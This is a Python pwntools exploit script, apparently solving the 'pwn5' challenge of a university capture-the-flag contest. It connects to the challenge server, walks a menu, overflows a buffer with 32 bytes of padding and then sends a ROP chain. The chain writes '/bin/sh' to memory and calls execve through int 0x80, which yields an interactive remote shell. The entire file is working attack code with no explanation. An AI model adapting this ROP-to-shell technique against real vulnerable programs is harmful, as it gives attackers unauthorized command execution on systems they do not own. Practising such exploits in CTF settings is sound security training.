#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = remote('pwn.ctf.tamu.edu', 4325)
#r = process('/tmp/p/pwn5')

trash = 'a'*32
int0x80 = 0x08071005
pop_eax = 0x080bc396
pop_ebx_edx = 0x08073389
pop_ecx = 0x080e4325
sh = 0x80c327d
mov_dedx_eax = 0x0805512b
buf = 0x80f2000-0x100

payload = flat([pop_ebx_edx, buf, buf, pop_eax, '/bin', mov_dedx_eax])
payload +=flat([pop_ebx_edx, buf, buf+4, pop_eax, '/sh\x00', mov_dedx_eax])
payload +=flat([pop_ebx_edx, buf, 0, pop_eax, 0xb, pop_ecx, 0, int0x80])

r.sendline('a')
r.sendline('a')
r.sendline('a')
r.send('y\n')
r.send('2\n')
r.sendline(trash + payload)


r.interactive()